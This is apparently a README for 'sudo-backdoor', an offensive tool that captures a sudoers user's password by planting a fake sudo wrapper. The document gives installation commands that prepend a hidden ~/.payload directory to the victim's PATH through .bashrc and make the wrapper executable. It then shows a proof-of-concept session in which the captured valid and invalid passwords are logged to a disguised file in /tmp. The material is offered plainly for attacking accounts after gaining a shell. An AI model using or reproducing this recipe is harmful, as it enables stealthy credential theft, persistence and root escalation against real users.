# sudo-backdoor
Wraps around `sudo` and logs user:password entries, for those annoying times when you get a shell on a sudoers account without knowing their password.

## Installation
Append the following line to the target user's `.bashrc` (or their appropriate shell's rc file) by running the following command:

`$ echo "export PATH=~/.payload:$PATH" >> ~/.bashrc`

Then, create `~/.payload/sudo` and paste the code found in `sudo.sh` in there.

*Don't forget to make the bash script executable by issuing the following command:*

`$ chmod a+x ~/.payload/sudo`

Obviously you might have to adapt this installation recipe to fit the user's shell. If they are using zsh, then install to ~/.zshrc, etc.


## Example
Proof of concept: `foobar` is the target with password `foobarz1`
```
[foobar:~]$ tail -n 1 ~/.bashrc
export PATH=~/.payload:$PATH
[foobar:~]$ ls -la ~/.payload/sudo 
-rwxr-xr-x 1 foobar foobar 420 Aug 16 01:21 /home/foobar/.payload/sudo
[foobar:~]$ sudo id
[sudo] password for foobar: # A wrong password is inserted here
Sorry, try again.
[sudo] password for foobar: # The correct password is inserted here
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log) 
[foobar:~]$ cat /tmp/.ICE-unix-test 
foobar:barbaz:invalid
foobar:foobarz1:valid
[foobar:~]$ sudo id # System remembers previous authentification
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
```
